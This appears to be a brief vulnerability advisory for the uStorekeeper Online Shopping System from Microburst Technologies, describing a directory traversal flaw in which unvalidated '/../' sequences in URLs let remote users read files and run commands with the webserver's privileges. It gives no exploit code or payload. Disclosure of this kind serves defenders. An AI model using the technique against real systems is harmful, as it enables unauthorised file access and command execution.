A vulnerability exists in versions of uStorekeeper Online Shopping System from Microburst Technologies.

The script fails to properly validate user-supplied input, allowing remote users to submit URLs containing '/../' sequences and arbitrary filenames or commands, which will be executed or displayed with the privilege level of the webserver user.

This permits the remote user to request files and execute commands from arbitrary locations on the host filesystem, outside the script's normal directory scope.
